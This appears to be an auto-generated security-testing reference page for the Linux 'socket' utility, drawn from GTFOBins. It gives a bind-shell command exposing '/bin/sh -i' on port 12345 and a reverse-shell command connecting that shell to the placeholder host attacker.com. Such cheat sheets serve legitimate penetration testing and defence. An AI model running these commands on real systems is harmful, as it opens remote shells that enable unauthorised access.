---
parsed_by: focuslocust
source: commands
type: generated
---
# socket Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## socket

Tool page: [socket](../../tools/linux/socket.md)

### bind-shell

```text
socket -svp '/bin/sh -i' 12345
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socket` |
| Evidence | Function example preserved from source parser. |

### reverse-shell

```text
socket -qvp '/bin/sh -i' attacker.com 12345
```

Provenance:

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/socket` |
| Evidence | Function example preserved from source parser. |
